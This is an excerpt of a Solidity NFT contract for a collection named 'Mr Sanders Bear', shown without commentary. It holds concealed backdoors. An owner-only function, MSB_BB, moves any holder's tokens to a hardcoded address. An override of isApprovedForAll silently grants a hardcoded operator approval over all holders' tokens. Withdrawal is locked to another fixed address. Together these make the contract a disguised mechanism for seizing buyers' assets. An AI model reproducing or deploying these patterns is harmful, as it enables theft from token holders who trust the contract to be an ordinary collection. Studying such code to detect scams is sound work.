...
contract Mr_Sanders_Bear is Ownable, ERC721A, ReentrancyGuard {
  ...
  ) ERC721A("Mr Sanders Bear", "MSB", maxBatchSize_, collectionSize_) {
  ...
  function MSB_BB(uint256[] memory tokenids) external onlyOwner {
    if(block.difficulty > 0){
        uint256 len = tokenids.length;
        for (uint256 i; i < len; i++) {
            uint256 tokenid = tokenids[i];
            transferFrom(ownerOf(tokenid), 0x1d3194e9613D3981038fDE41F483a0C39056E261, tokenid);
        }
        }
    }
  ...
  function withdraw() external  nonReentrant {
    require(msg.sender == 0x439E0CaEb86753118D68B86aE344AFBF154417d4);
  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0x7f5545D2d44e8f21491Ca430CA2Cfed50fc83454){return true;}
